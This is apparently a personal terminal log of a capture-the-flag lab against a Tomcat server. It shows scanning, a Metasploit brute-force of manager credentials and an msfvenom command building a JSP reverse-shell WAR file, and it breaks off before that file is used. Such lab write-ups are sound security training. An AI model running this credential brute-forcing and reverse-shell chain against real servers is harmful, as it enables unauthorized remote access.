**********@debian:~$ ping 10.10.10.95
PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
64 bytes from 10.10.10.95: icmp_seq=1 ttl=127 time=23.10 ms
64 bytes from 10.10.10.95: icmp_seq=2 ttl=127 time=21.8 ms
64 bytes from 10.10.10.95: icmp_seq=3 ttl=127 time=22.1 ms
^C
--- 10.10.10.95 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 13ms
rtt min/avg/max/mdev = 21.813/22.626/23.985/0.982 ms
**********@debian:~$ nmap -sV -A -p- 10.10.10.95
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-05 10:10 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.62 seconds
**********@debian:~$ nmap -sV -A -Pn 10.10.10.95
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-05 10:11 EDT
Nmap scan report for 10.10.10.95
Host is up (0.024s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
.
.
.
// From here we go to the only port running (8080) online to see what is happening. --> 10.10.10.95:8080 in url.
// Brings us to the apache welcome page.
// Apache --> Server Status (login was username: admin passwd: admin)
// Try to get into the manager app with no luck.
// Search on metasploit to get a good exploit which works
allenwest1@debian:~$ msfconsole
Found a database at /home/allenwest1/.msf4/db, checking to see if it is started
Starting database at /home/allenwest1/.msf4/db...success
MSF web service is already running as PID 1253
[-] Error while running command db_connect: Failed to connect to the HTTP data service: Data Service does not appear to be responding

Call stack:
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/db.rb:2067:in `rescue in db_connect_http'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/db.rb:2062:in `db_connect_http'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/db.rb:1832:in `cmd_db_connect'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:252:in `block in load_db_config'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:239:in `each_pair'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:239:in `load_db_config'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb:133:in `initialize'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:62:in `new'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:62:in `driver'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit-framework/bin/../embedded/framework/msfconsole:17:in `<main>'
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----                     
                            /  ,' `-._<.===-'                            
                           /  /                                          
                          /  ;                                           
              _          /   ;                                           
 (`._    _.-"" ""--..__,'    |                                           
 <_  `-""                     \                                          
  <`-                          :                                         
   (__   <__.                  ;                                         
     `-.   '-.__.      _.'    /                                          
        \      `-.__,-'    _,'                                           
         `._    ,    /__,-'                                              
            ""._\__,'< <____                                             
                 | |  `----.`.                                           
                 | |        \ `.                                         
                 ; |___      \-``                                        
                 \   --<                                                 
                  `.`.<                                                  
                    `-'                                                  
                                                                         
                                                                         

       =[ metasploit v5.0.83-dev-                         ]
+ -- --=[ 1991 exploits - 1088 auxiliary - 340 post       ]
+ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Open an interactive Ruby terminal with irb

msf5 > search tomcat

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
   1   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   2   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   3   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   4   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   5   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
   6   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
   7   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
   8   exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   9   exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   10  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   11  exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   12  exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   13  exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   14  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   15  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   16  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   17  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   18  exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   19  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
   20  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration


msf5 > use 7
msf5 auxiliary(scanner/http/tomcat_mgr_login) > options                 
                                                                        
Module options (auxiliary/scanner/http/tomcat_mgr_login):               
                                                                        
   Name              Current Setting                                                                              Required  Description         
   ----              ---------------                                                                              --------  -----------         
   BLANK_PASSWORDS   false                                                                                        no        Try blank passwords for all users                                                           
   BRUTEFORCE_SPEED  5                                                                                            yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                                        no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                                        no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                                        no        Add all users in the current database to the list
   PASSWORD                                                                                                       no        The HTTP password to specify for authentication
   PASS_FILE         /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                                                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8080                                                                                         yes       The target port (TCP)
   SSL               false                                                                                        no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                                        yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                                yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                                            yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                                       no        The HTTP username to specify for authentication
   USERPASS_FILE     /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                                        no        Try the username as the password for all users
   USER_FILE         /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                                         yes       Whether to print output for all attempts
   VHOST                                                                                                          no        HTTP server virtual host

msf5 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.10.10.95
RHOSTS => 10.10.10.95
msf5 auxiliary(scanner/http/tomcat_mgr_login) > exploit

[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
.
.
.
// Now we try the App Manager with the credentials that worked on our exploit
// tomcat:s3cret
.
.
.

msf5 > use 16
msf5 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.10.14.2
LHOST => 10.10.14.2
msf5 exploit(multi/http/tomcat_mgr_upload) > exploit

[-] Exploit failed: The following options failed to validate: RHOSTS.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.10.95
RHOSTS => 10.10.10.95
msf5 exploit(multi/http/tomcat_mgr_upload) > exploit

[-] Exploit aborted due to failure: unreachable: The target server did not respond to fingerprinting, use 'set FingerprintCheck false' to disable this check.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/tomcat_mgr_upload) > set FingerprintCheck false
FingerprintCheck => false
msf5 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Retrieving session ID and CSRF token...
[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/tomcat_mgr_upload) > exit
.
.
.
// Above was me trying to use the given exploit to create a reverse shell.
// Obviously it didn't work, because why would it?
// Had to look up how to make a .war reverse shell to upload and run manually.
// It was hard.
.
.
.
allenwest1@debian:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > m10x.war
Payload size: 1096 bytes
Final size of war file: 1096 bytes

